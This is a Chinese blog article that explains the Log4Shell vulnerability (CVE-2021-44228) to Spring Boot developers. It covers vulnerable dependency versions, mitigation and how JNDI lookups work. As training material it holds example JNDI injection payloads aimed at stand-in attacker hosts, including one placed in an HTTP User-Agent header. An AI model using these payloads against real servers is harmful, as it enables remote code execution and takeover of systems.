> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzI4NzA1Nzg5OA==&mid=2247486006&idx=1&sn=670efdd62c093c7f18dfd3058aab155e

#  给开发工程师讲的log4j漏洞原理  
原创 鲶鱼爱魔方  透明魔方   2025-07-21 11:12  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/U6oY6Hu3lnkHRtXJqQhBsk5ico9jOFZoPLnkWNvjdSqEIV7rsnh4DVdZ7iaoWkWyOAS7z7dicicibJyoNx08O3LAa0Q/640?wx_fmt=jpeg "")  
  
前几天，某安服厂商拉到了某开发公司的培训单子，需要给开发、运维、测试人员做一个网络安全培训。  
  
这可是个稀罕活儿，因为国内很少接到这种单子，安服的客户基本都是  
合规  
刚需客户（政府、事业单位和大型国企）  
  
甲方指定要特别给  
开发工程师讲讲log4j漏洞。  
  
cf有点好奇，于是问：“为什么要特别讲这个漏洞呢？”  
  
甲说：“实不相瞒，在下所在的公司因为开发问题出现过严重的数据泄露事件，然后这个漏洞我们公司出现的可能性比较高，所以要讲讲。”  
  
后来  
cf  
打听到这家客户  
技术栈主要为Java，开发框架主要为springboot。  
这种情况和**Log4j 漏洞**  
（CVE-2021-44228）确实有潜在关联。  
  
比如这家客户的 Spring Boot 应用使用了**Log4j 2.x**  
作为日志框架，那么就可能存在安全风险。  
  
下面cf啰里吧嗦的把Log4j漏洞与Spring Boot的关系说一下：  
  
先说说Log4j 漏洞  
（CVE-2021-44228）  
  
Log4j 2.x（版本 <= 2.15.0）存在远程代码执行漏洞，攻击者可以  
按漏洞所需的条件  
构造一个恶意的日志输入，输入中含的恶意的代码就会执行啦。  
（这个后面还会详细说）  
  
再说说Spring Boot，  
Spring Boot本身不强制使用Log4j 2.x ，但如果项目中手动引入了Log4j-core依赖（如通过pom.xml或build.gradle)，则存在风险。  
  
接下来，我们看一个项目的依赖文件pom.xml示例。  
贴的这段配置，就是告诉 Maven：“去给我买 Log4j 这个日志库！”，在这个里面，重点关注<version>2.x.x</version>，一定要检查版本是否  
<= 2.15.0。  
  

```
<!-- Maven依赖示例 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.x.x</version> <!-- 版本 <= 2.15.0 存在风险 -->
</dependency>
```

  
  
小字备注，有的做安全的萌新（不怎么做开发）可能对Maven不懂，我这边稍微解释一下。可以把Maven想象成一个“代码商店+自动管家”，啥叫代码商店呢？我们开发Java项目时，你需要很多别人写好的代码，这些代码都存在Maven中央仓库里，就像一个巨型代码超市。啥叫自动管家呢？你不用自己去超市一个个下载代码文件，只需要在项目里写一行配置，Maven就会自动帮你去“代码超市”找到对应的代码包，下载到你的项目里，还会自动帮你处理这些代码包之间的依赖关系，不用你一个个找。  
项目里可能用到几十个库（日志、数据库、工具类…），Maven 能集中管理它们的版本，避免版本冲突。  
  
不过总的来说，Spring Boot版本与Log4j有如下的关系：  
<table><tbody><tr><td data-colwidth="147"><section><span style="color: rgba(0, 0, 0, 0.95);font-family: Inter, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, &#34;SF Pro SC&#34;, &#34;SF Pro Display&#34;, &#34;SF Pro Icons&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, &#34;Helvetica Neue&#34;, Helvetica, Arial, sans-serif;font-size: 15px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 600;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(242, 242, 242);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">Spring Boot 版本</span></span></section></td><td data-colwidth="116"><section><span style="color: rgba(0, 0, 0, 0.95);font-family: Inter, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, &#34;SF Pro SC&#34;, &#34;SF Pro Display&#34;, &#34;SF Pro Icons&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, &#34;Helvetica Neue&#34;, Helvetica, Arial, sans-serif;font-size: 15px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 600;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(242, 242, 242);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">默认日志框架</span></span></section></td><td data-colwidth="243"><section><span style="color: rgba(0, 0, 0, 0.95);font-family: Inter, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, &#34;SF Pro SC&#34;, &#34;SF Pro Display&#34;, &#34;SF Pro Icons&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, &#34;Helvetica Neue&#34;, Helvetica, Arial, sans-serif;font-size: 15px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 600;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(242, 242, 242);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">风险说明</span></span></section></td></tr><tr><td data-colwidth="147"><section><span style="color: rgba(0, 0, 0, 0.8);font-family: Inter, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, &#34;SF Pro SC&#34;, &#34;SF Pro Display&#34;, &#34;SF Pro Icons&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, &#34;Helvetica Neue&#34;, Helvetica, Arial, sans-serif;font-size: 15px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">2.4.x 及以上</span></span></section></td><td data-colwidth="116"><section><span style="color: rgba(0, 0, 0, 0.8);font-family: Inter, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, &#34;SF Pro SC&#34;, &#34;SF Pro Display&#34;, &#34;SF Pro Icons&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, &#34;Helvetica Neue&#34;, Helvetica, Arial, sans-serif;font-size: 15px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">Logback</span></span></section></td><td data-colwidth="243"><section><span style="color: rgba(0, 0, 0, 0.8);font-family: Inter, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, &#34;SF Pro SC&#34;, &#34;SF Pro Display&#34;, &#34;SF Pro Icons&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, &#34;Helvetica Neue&#34;, Helvetica, Arial, sans-serif;font-size: 15px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">若未手动引入 Log4j 2.x，则安全</span></span></section></td></tr><tr><td data-colwidth="147"><section><span style="color: rgba(0, 0, 0, 0.8);font-family: Inter, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, &#34;SF Pro SC&#34;, &#34;SF Pro Display&#34;, &#34;SF Pro Icons&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, &#34;Helvetica Neue&#34;, Helvetica, Arial, sans-serif;font-size: 15px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">2.3.x 及以下</span></span></section></td><td data-colwidth="116"><section><span style="color: rgba(0, 0, 0, 0.8);font-family: Inter, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, &#34;SF Pro SC&#34;, &#34;SF Pro Display&#34;, &#34;SF Pro Icons&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, &#34;Helvetica Neue&#34;, Helvetica, Arial, sans-serif;font-size: 15px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">Log4j 2.x</span></span></section></td><td data-colwidth="243"><section><span style="color: rgba(0, 0, 0, 0.8);font-family: Inter, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, &#34;SF Pro SC&#34;, &#34;SF Pro Display&#34;, &#34;SF Pro Icons&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, &#34;Helvetica Neue&#34;, Helvetica, Arial, sans-serif;font-size: 15px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">需检查版本是否高于 2.17.1</span></span></section></td></tr></tbody></table>  
可以通过检查依赖、升级版本或切换日志框架，以消除安全隐患。  
若无法立即升级，可通过添加 JVM 参数禁用 JNDI 功能。  

```
-Dlog4j2.formatMsgNoLookups=true
```

  
嗯，接下来，我们好好把Log4j漏洞  
（CVE-2021-44228）说一下。  
  
这个漏洞使得攻击者能够通过利用Log4j2中的JNDI（Java 命名和目录接口）  
查找功能，在服务器上执行任意代码。  
  
看来罪魁祸首就是这个  
JNDI  
查  
找功能。  
  
看看这个JNDI查找功能都有什么设计缺陷吧：  
  
当系统记录包含
```
${jndi:ldap://attacker.com/x}
```

  
字符串时：  
1. **表达式解析（Parsing）**  
  
Log4j2首先会**解析**  
日志内容中的
```
${}
```

  
表达式结构，识别出这是一个JNDI查找指令。  
  
1. **JNDI查找（Lookup）**  
  
接着会执行**JNDI查找**  
操作：  
  
1. 根据协议（ldap/rmi/dns）初始化对应服务  
  
1. 向
```
attacker.com
```

  
的LDAP服务发起查询请求  
  
1. 接收LDAP服务器返回的序列化对象引用  
  
1. **动态加载（Dynamic Loading）**  
  
如果返回的是远程Java对象引用（如
```
javaFactoryClass
```

  
），JVM会：  
  
1. 从攻击者指定的URL下载.class文件  
  
1. 通过类加载器实例化该对象  
  
1. 执行其构造函数/静态代码块  
  
这个问题，本质上是利用了 Log4j2 对 JNDI 查找功能的 “安全校验缺失”—— 它没有判断这个 “查找请求” 是否来自可信来源，就盲目执行了。  
  
  
专业点来说，原始版本未对JNDI查找做：  
- 协议白名单验证  
  
- 目标地址过滤  
  
- 类加载限制  
  
  
  
这个漏洞的可怕之处在于：攻击者能通过网络 “隔空” 让大量使用 Log4j2 的服务器 “听话”，执行任何恶意操作，因此被称为 “史诗级漏洞”。  
  
接下来，再举个例子解释一下，我的目标是萌新也能看懂。  
（谁叫我以前是做老师的呢，职业强迫症使然）  
1. **构造恶意请求**  
  
攻击者发送特制的HTTP请求，在User-Agent头中植入JNDI注入代码：  
  

```
GET/HTTP/1.1
Host:vulnerable-server.com
User-Agent:${jndi:ldap://malicious-server.com/a}
```

  
**触发日志记录**  
  
存在漏洞的服务器在记录User-Agent头时，会解析其中的JNDI表达式  
1. **执行恶意代码链**  
  
1. 服务器向
```
malicious-server.com
```

  
发起LDAP查询  
  
1. 从攻击者控制的LDAP服务器获取恶意Java类  
  
1. 自动加载并执行该类中的代码  
  
1. **攻击完成**  
  
恶意代码在服务器上运行，攻击者获得系统控制权  
  
敲黑板，任何会被记录到日志的输入点都可能成为攻击载体，包括：  
- HTTP头字段（X-Forwarded-For/Referer等）  
  
- 请求参数（GET/POST）  
  
- Cookie值  
  
好了，我现在对可能出现的场景——漏洞原理——漏洞举例做了一个解释的闭环，不知道看官您看懂了没？如果没看懂，把下面的名词解释再看看。  
  
接下来是名词解释：  
  
什么是Log4j？  
  
Log4j是Apache开发的一款常用日志记录工具  
（  
是 Java 生态中最常用的 **日志管理库（library）**  
），而Log4j2 是它的一个版本。这个漏洞影响巨大，被视为严重的安全问题。  
  
**什么是JNDI？**  
  
**Java 命名和目录接口：一个帮 Java 程序 “通过简单名字 + 属性信息” 快速找到并访问各种资源的工具。**  
  
**它是 Java 平台的一项技术，用于在 Java 应用程序中查找和访问各种资源，比如数据库连接、命名对象等。可以把JNDI想象成一个大型商场的 “导航索引系统”，帮助Java应用程序快速找到需要的 “资源店铺”。例如，在 Java 应用程序中，当需要获取数据库连接资源时，开发人员就像商场里要找餐厅的顾客，会通过 JNDI 提供的接口，传入数据库连接对应的名称（比如 “myDBConnection”），JNDI 就会去查找并返回数据库连接的详细信息，像数据库服务器的地址、端口号、用户名和密码等，然后应用程序就能依据这些信息建立与数据库的连接，就如同顾客按照导航索引找到餐厅并进入用餐一样。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/U6oY6Hu3lnkHRtXJqQhBsk5ico9jOFZoPQAzibibCIQuX1YsfI6yxlQjegE6nTPzb8vk7cy75JFInT5emeqZMiaFvA/640?wx_fmt=png&from=appmsg "")  
  
  
点“在看”过20，明天我就po一个  
log4j漏洞复现的  
实操贴。  
  
ps ：本人最近在研究网络安全运营平台SOC功能和相关技术，正在用相关平台的用户，或者研究开发过类似产品的朋友可以加我V：catfishfighting，务必备注SOC，需要帮我填一份调查问卷，填好我就拉你进SOC群，大家一起交流学习，后续我也会在群里公布我的小调研结果。  
  
  
  
  
  
